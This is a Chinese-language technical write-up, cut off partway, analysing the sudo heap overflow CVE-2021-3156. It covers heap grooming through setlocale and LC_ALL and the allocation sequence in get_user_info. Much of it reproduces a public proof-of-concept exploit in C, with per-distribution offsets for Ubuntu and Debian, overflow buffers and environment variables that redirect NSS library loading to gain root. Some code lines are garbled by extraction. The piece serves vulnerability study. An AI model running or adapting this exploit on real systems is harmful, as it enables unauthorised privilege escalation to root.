#### 前言：
前几天在`chamd5`上分析过该CVE的调用链，本来想着这个bypass手法先存着，但是生活所迫QAQ。  
漏洞利用有点过于复杂，多方参考，如有错误请谅解。
#### LC_*控制环境堆：
关于locale和nss的解析可以参考这篇文章：[CVE-2021-3156 sudo heap-based bufoverflow
复现&分析](https://www.anquanke.com/post/id/231408)  
在`sudo.c`中，最开始就使用了`setlocale(LC_ALL, '');`来配置字符集环境，会申请和释放大量堆块。
    setlocale(LC_ALL, "");    //配置本机字符集
        bindtextdomain(PACKAGE_NAME, LOCALEDIR);
        textdomain(PACKAGE_NAME);
##### 分析`setlocale`
进入`_nl_find_locale`  
获取到环境变量参数  
##### 分析`_nl_make_l10nflist`
所以我们只需要载入一个如：`LC_ALL=PI:EMAIL`的堆块即可生成一个大的`tcache`块。
#### 分析get_user_info：
get_user_info函数在获取用户信息的时候需要获取用户的用户名和口令信息，这就需要到了nss服务，也就是需要调用passwd对应的服务规范。在函数中会调用根据配置文件初始化file/systemd等服务规范给各个配置文件进行堆分配，然后尽量我们使用`setlocale`生成的巨大块，然后  
执行`get_user_info`过程中的堆申请情况：
    malloc(0x100)
    malloc(0x400)
    malloc(0x228)    //tcache
    malloc(0x10)
    malloc(0x78) //passwd->compat files
    malloc(0x1000)
    malloc(0x17) //unsortbin -> largebin
    malloc(0x37)
    malloc(0x38)
    malloc(0x16)
    malloc(0x37)
    malloc(0x38)
    malloc(0x17)
    malloc(0x37)
    malloc(0x17)
    malloc(0x36)
    malloc(0x16)
    ......
服务调用链：  
然后就会在`ni->name = compat`的`service_user`块前面产生一个`0x80`的`free`块  
#### EXP解析：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    // 512 environment variables should be enough for everyone
    #define MAX_ENVP 512
    #define SUDOEDIT_PATH "/usr/bin/sudoedit"
    typedef struct {
        char *target_name;
        char *sudoedit_path;
        uint32_t smash_len_a;
        uint32_t smash_len_b;
        uint32_t null_stomp_len;
        uint32_t lc_all_len; 
    } target_t;
    target_t targets[] = {
        {
            // Yes, same values as 20.04.1, but also confirmed.
            .target_name    = "Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27",
            .sudoedit_path  = SUDOEDIT_PATH,
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
        {
            .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
            .sudoedit_path  = SUDOEDIT_PATH,
            .smash_len_a    = 56,
            .smash_len_b    = 54,
            .null_stomp_len = 63, 
            .lc_all_len     = 212
        },
        {
            .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
            .sudoedit_path  = SUDOEDIT_PATH,
            .smash_len_a    = 64,
            .smash_len_b    = 49,
            .null_stomp_len = 60, 
            .lc_all_len     = 214
        }
    };
    void usage(char *prog) {
        fprintf(stdout,
            "  usage: %s \n\n"
            "  available targets:\n"
            "  ------------------------------------------------------------\n",
            prog
        );
        for(int i = 0; i    \n"
            "\n",
            prog
        );
    }
    int main(int argc, char *argv[]) {
        printf("\n** CVE-2021-3156 PoC by blasty \n\n");
        if (argc != 2 && argc != 5) {
            usage(argv[0]);
            return -1;
        }
        target_t *target = NULL;
        if (argc == 2) {
            int target_idx = atoi(argv[1]);
            if (target_idx = (sizeof(targets) / sizeof(target_t))) {
                fprintf(stderr, "invalid target index\n");
                return -1;
            }
            target = &targets[ target_idx ];
        }  else {
            target = malloc(sizeof(target_t));
            target->target_name    = "Manual";
            target->sudoedit_path  = SUDOEDIT_PATH; // "/usr/bin/sudoedit"
            target->smash_len_a    = atoi(argv[1]);
            target->smash_len_b    = atoi(argv[2]);
            target->null_stomp_len = atoi(argv[3]);
            target->lc_all_len     = atoi(argv[4]);
        }
        printf(
            "using target: %s ['%s'] (%d, %d, %d, %d)\n", 
            target->target_name,
            target->sudoedit_path,
            target->smash_len_a,
            target->smash_len_b,
            target->null_stomp_len,
            target->lc_all_len
        );
        char *smash_a = calloc(target->smash_len_a + 2, 1);     //这里填充多2个字节
        char *smash_b = calloc(target->smash_len_b + 2, 1);     //这里填充多2个字节
        memset(smash_a, 'A', target->smash_len_a);  //填充A
        memset(smash_b, 'B', target->smash_len_b);  //填充B
        smash_a[target->smash_len_a] = '\\';
        smash_b[target->smash_len_b] = '\\';
        char *s_argv[]={
            "sudoedit", "-s", smash_a, "\\", smash_b, NULL
        };
        /** 56 * A + '\\' + '\0' + '\0' + '\\' + '\0' + 54 * B + '\\' + '\0'    
         ** 生成113个字节空间
         **/
        char *s_envp[MAX_ENVP];
        int envp_pos = 0;
        for(int i = 0; i null_stomp_len; i++) {
            s_envp[envp_pos++] = "\\";  //写入63个\\
        }
        s_envp[envp_pos++] = "X/P0P_SH3LLZ_";
        char *lc_all = calloc(target->lc_all_len + 16, 1);  //212